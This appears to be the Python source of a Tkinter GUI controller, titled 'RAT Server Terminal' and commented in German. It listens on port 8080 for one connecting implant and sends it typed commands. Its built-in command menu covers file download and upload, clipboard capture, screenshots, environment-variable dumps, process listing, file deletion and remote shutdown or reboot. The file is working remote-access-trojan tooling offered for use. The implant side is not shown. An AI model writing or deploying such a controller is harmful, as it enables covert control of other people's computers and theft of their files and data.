import socket
import threading
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from tkinter import font, ttk

HOST = '0.0.0.0'  # Lauscht auf allen Interfaces
PORT = 8080

# Farbdefinitionen
BG_COLOR = '#000000'  # Schwarz
TEXT_COLOR = '#0000AA'  # Dunkelblau
BUTTON_BG = '#1a1a1a'  # Dunkelgrau
BUTTON_ACTIVE = '#2a2a2a'  # Etwas helleres Grau
BORDER_COLOR = '#1a1a1a'  # Dunkelgrau für Rahmen

COMMAND_CATEGORIES = {
    "System": {
        "help": "Zeigt diese Hilfe an",
        "time": "Gibt die aktuelle Uhrzeit zurück",
        "date": "Gibt das aktuelle Datum zurück",
        "hostname": "Gibt den Rechnernamen zurück",
        "os": "Betriebssystemname und Version",
        "whoami": "Aktuell angemeldeter Benutzer",
        "uptime": "Wie lange der Rechner läuft (systembefehl)",
        "shutdown": "Fährt den Rechner herunter",
        "reboot": "Startet den Rechner neu",
    },
    "Datei & Verzeichnis": {
        "cwd": "Aktuelles Arbeitsverzeichnis",
        "listdir <pfad>": "Listet Dateien und Ordner im Verzeichnis (Standard: .) (max. 50 Einträge)",
        "mkdir <pfad>": "Erstellt Verzeichnis",
        "rmdir <pfad>": "Löscht leeres Verzeichnis",
        "delete <pfad>": "Löscht Datei",
        "tree <pfad>": "Zeigt Verzeichnisstruktur als Baum",
        "download <pfad>": "Sendet Datei als Base64",
        "upload <pfad> <base64>": "Speichert Datei aus Base64",
    },
    "System-Informationen": {
        "disk": "Zeigt Speicherplatz auf Platte (systembefehl)",
        "env": "Zeigt Umgebungsvariablen (systembefehl, max. 50)",
        "cpu": "CPU-Informationen (systembefehl)",
        "memory": "Arbeitsspeicher-Auslastung (systembefehl)",
        "processes": "Zeigt laufende Prozesse",
        "users": "Zeigt eingeloggte Benutzer",
        "lsusb": "Zeigt USB-Geräte (nur Linux/Mac)",
    },
    "Netzwerk": {
        "ping <host>": "Ping an Host (systembefehl, 3 Pakete)",
        "netstat": "Zeigt offene Netzwerkverbindungen",
        "ipconfig": "Zeigt Netzwerk-Konfiguration",
    },
    "Sonstiges": {
        "clipboard": "Inhalt der Zwischenablage",
        "echo <text>": "Sendet den Text zurück",
        "reverse <text>": "Gibt den Text rückwärts aus",
        "screenshot": "Macht Screenshot und speichert temporär",
        "exit": "Beendet die Verbindung und das Programm",
    }
}

class RATServerGUI:
    def __init__(self, master):
        self.master = master
        master.title("RAT Server Terminal")
        
        # Konfiguriere das Hauptfenster
        master.configure(bg=BG_COLOR)
        
        # Erstelle das Hauptlayout
        self.main_frame = tk.Frame(master, bg=BG_COLOR)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Erstelle den Command Panel Frame
        self.command_frame = tk.Frame(self.main_frame, bg=BG_COLOR, width=350)
        self.command_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(10, 0), pady=10)
        self.command_frame.pack_propagate(False)
        
        # Erstelle den Terminal Frame
        self.terminal_frame = tk.Frame(self.main_frame, bg=BG_COLOR)
        self.terminal_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Erstelle den Toggle Button
        self.toggle_button = tk.Button(
            self.terminal_frame,
            text="📋 COMMANDS",
            command=self.toggle_command_panel,
            bg=BUTTON_BG,
            fg=TEXT_COLOR,
            activebackground=BUTTON_ACTIVE,
            activeforeground=TEXT_COLOR,
            relief=tk.FLAT,
            font=('Consolas', 10, 'bold'),
            padx=10,
            pady=5
        )
        self.toggle_button.pack(anchor=tk.NW, pady=(0, 10))
        
        # Erstelle das Command Panel
        self.create_command_panel(self.command_frame)
        
        # Verstecke das Command Panel initial
        self.command_frame.pack_forget()
        
        # Erstelle einen Frame für die Eingabezeile
        input_frame = tk.Frame(self.terminal_frame, bg=BG_COLOR)
        input_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=(0, 10))
        
        # Konfiguriere die Textfläche
        self.text_area = ScrolledText(
            self.terminal_frame,
            height=20,
            width=80,
            bg=BG_COLOR,
            fg=TEXT_COLOR,
            insertbackground=TEXT_COLOR,
            font=('Consolas', 10),
            relief=tk.FLAT,
            highlightthickness=1,
            highlightbackground=BORDER_COLOR
        )
        self.text_area.pack(fill=tk.BOTH, expand=True)
        
        # Konfiguriere die Eingabezeile
        self.entry = tk.Entry(
            input_frame,
            width=70,
            bg=BUTTON_BG,
            fg=TEXT_COLOR,
            insertbackground=TEXT_COLOR,
            font=('Consolas', 10),
            relief=tk.FLAT,
            highlightthickness=1,
            highlightbackground=BORDER_COLOR
        )
        self.entry.pack(side=tk.LEFT, padx=(0, 10))
        self.entry.bind('<Return>', self.send_command)
        
        # Konfiguriere den Senden-Button
        self.send_button = tk.Button(
            input_frame,
            text="Senden",
            command=self.send_command,
            bg=BUTTON_BG,
            fg=TEXT_COLOR,
            activebackground=BUTTON_ACTIVE,
            activeforeground=TEXT_COLOR,
            relief=tk.FLAT,
            font=('Consolas', 10)
        )
        self.send_button.pack(side=tk.LEFT)
        
        # Füge einen Prompt hinzu
        self.entry.insert(0, "> ")
        self.entry.bind('<Key>', self.handle_key)
        
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket = None
        
        threading.Thread(target=self.start_server, daemon=True).start()

    def toggle_command_panel(self):
        if self.command_frame.winfo_ismapped():
            self.command_frame.pack_forget()
            self.toggle_button.configure(text="📋 COMMANDS")
        else:
            self.command_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(10, 0), pady=10)
            self.toggle_button.configure(text="❌ COMMANDS")

    def create_command_panel(self, parent):
        # Erstelle den Titel
        title_frame = tk.Frame(parent, bg=BG_COLOR)
        title_frame.pack(fill=tk.X, pady=(0, 10))
        
        title_label = tk.Label(
            title_frame,
            text="AVAILABLE COMMANDS",
            bg=BG_COLOR,
            fg=TEXT_COLOR,
            font=('Consolas', 12, 'bold')
        )
        title_label.pack(side=tk.LEFT)
        
        # Erstelle einen Frame für die Befehle
        commands_frame = tk.Frame(parent, bg=BG_COLOR)
        commands_frame.pack(fill=tk.BOTH, expand=True)
        
        # Erstelle eine Textbox für die Befehle
        self.commands_text = ScrolledText(
            commands_frame,
            bg=BG_COLOR,
            fg=TEXT_COLOR,
            font=('Consolas', 9),
            relief=tk.FLAT,
            highlightthickness=1,
            highlightbackground=BORDER_COLOR,
            wrap=tk.WORD
        )
        self.commands_text.pack(fill=tk.BOTH, expand=True)
        
        # Füge die Befehle nach Kategorien hinzu
        for category, commands in COMMAND_CATEGORIES.items():
            # Füge Kategorie-Header hinzu
            self.commands_text.insert(tk.END, f"\n{category}\n", "category")
            self.commands_text.insert(tk.END, "=" * len(category) + "\n\n", "category")
            
            # Füge Befehle der Kategorie hinzu
            for cmd, desc in sorted(commands.items()):
                self.commands_text.insert(tk.END, f"{cmd}\n", "cmd")
                self.commands_text.insert(tk.END, f"    {desc}\n\n", "desc")
        
        # Konfiguriere Tags
        self.commands_text.tag_configure("category", foreground=TEXT_COLOR, font=('Consolas', 10, 'bold'))
        self.commands_text.tag_configure("cmd", foreground=TEXT_COLOR, font=('Consolas', 9, 'bold'))
        self.commands_text.tag_configure("desc", foreground=TEXT_COLOR)
        self.commands_text.config(state=tk.DISABLED)
        
        # Füge einen Hover-Effekt für die Befehle hinzu
        self.commands_text.bind('<Motion>', self.on_command_hover)

    def on_command_hover(self, event):
        # Finde die Zeile unter dem Mauszeiger
        index = self.commands_text.index(f"@{event.x},{event.y}")
        line = self.commands_text.get(f"{index} linestart", f"{index} lineend")
        
        # Wenn es ein Befehl ist (nicht leer und keine Beschreibung/Kategorie)
        if line and not line.startswith("    ") and not line.startswith("="):
            self.commands_text.config(cursor="hand2")
        else:
            self.commands_text.config(cursor="")

    def handle_key(self, event):
        # Verhindere das Löschen des Prompts
        if event.keysym == 'BackSpace':
            if len(self.entry.get()) <= 2:  # Nur "> " im Entry
                return 'break'
        elif event.keysym == 'Home':
            self.entry.icursor(2)  # Setze Cursor nach dem Prompt
            return 'break'

    def start_server(self):
        self.server_socket.bind((HOST, PORT))
        self.server_socket.listen(1)
        self.append_text(f"Server lauscht auf {HOST}:{PORT} ...\n")
        self.client_socket, addr = self.server_socket.accept()
        self.append_text(f"Verbindung von {addr}!\n")
        threading.Thread(target=self.receive_loop, daemon=True).start()

    def send_command(self, event=None):
        cmd = self.entry.get()[2:].strip()  # Entferne den Prompt
        if self.client_socket and cmd:
            try:
                self.client_socket.sendall(cmd.encode() + b'\n')
                self.append_text(f">>> {cmd}\n")
                self.entry.delete(0, tk.END)
                self.entry.insert(0, "> ")
            except Exception as e:
                self.append_text(f"[Fehler beim Senden: {e}]\n")

    def receive_loop(self):
        while True:
            try:
                data = self.client_socket.recv(4096)
                if not data:
                    self.append_text("[Verbindung getrennt]\n")
                    break
                self.append_text(data.decode(errors='ignore'))
            except Exception as e:
                self.append_text(f"[Fehler beim Empfangen: {e}]\n")
                break

    def append_text(self, text):
        self.text_area.insert(tk.END, text)
        self.text_area.see(tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    gui = RATServerGUI(root)
    root.mainloop()